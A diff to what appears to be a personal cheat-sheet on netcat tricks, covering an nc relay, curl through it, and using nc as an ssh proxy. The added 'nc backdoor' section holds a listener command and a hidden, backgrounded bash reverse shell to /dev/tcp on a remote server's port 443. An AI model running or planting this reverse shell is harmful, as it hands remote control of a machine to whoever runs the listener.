@@ -11,6 +11,15 @@ nc -k -l 127.0.0.1 8000 <x | nc [targt host]:[port] >x
 curl -x 127.0.0.1:8000 [target host]:[port]
 ```
 
+# nc backdoor
+```
+# remote control server 
+$ sudo nc -nvlp 443 
+
+# local conn tty
+nohup /usr/bin/env -i /bin/bash 2>/dev/null — norc — noprofile >& /dev/tcp/[remote server ip]/443 0>&1 &
+```
+
 # ssh config 用nc 當proxy
 
 [參考](https://shazi.info/%E5%88%A9%E7%94%A8ssh-proxycommand%E5%8F%8Anc%E5%81%9A%E8%B7%B3%E6%9D%BF%E7%9A%84%E9%80%A3%E7%B7%9A%E6%87%89%E7%94%A8/)
